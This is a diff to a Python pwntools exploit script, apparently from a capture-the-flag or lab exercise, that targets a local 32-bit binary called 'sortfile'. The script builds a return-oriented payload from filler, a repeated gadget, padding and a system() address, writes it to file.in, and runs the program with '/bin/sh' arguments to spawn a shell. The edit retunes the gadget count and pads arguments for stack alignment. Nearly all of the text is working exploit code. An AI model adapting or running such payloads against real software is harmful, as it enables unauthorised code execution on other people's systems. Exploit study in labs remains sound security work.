@@ -42,6 +42,8 @@ context(arch='i386', os='linux')
 # ebp + 4  	; gadget 1 ;ret address
 # ebp 		; garbage
 
+# ebp -0x100c ; 
+
 
 
 exploit = "/bin/sh"
@@ -54,7 +56,7 @@ pop30 = gadgetx30 + "A"*0x2c
 # exploitlocation = p32(0x804a04c)
 
 
-data = filler + gadget1*37  + gadgetx30 + "A"*0x2c + system
+data = filler + gadget1*42  + gadgetx30 + "A"*0x2c + system
 
 with open("file.in", "w") as f:
 	f.write(data)
@@ -65,7 +67,8 @@ with open("file.in", "w") as f:
 
 # Start the program as a subprocess
 # so we can communicate with it
-p = process(['./sortfile',exploit])
+# Extra because of memory alignment in main.
+p = process(['./sortfile',exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit,exploit])
 
 # Optional: attach GDB to the process and run some GDB commands
 # gdb.attach(p, '''
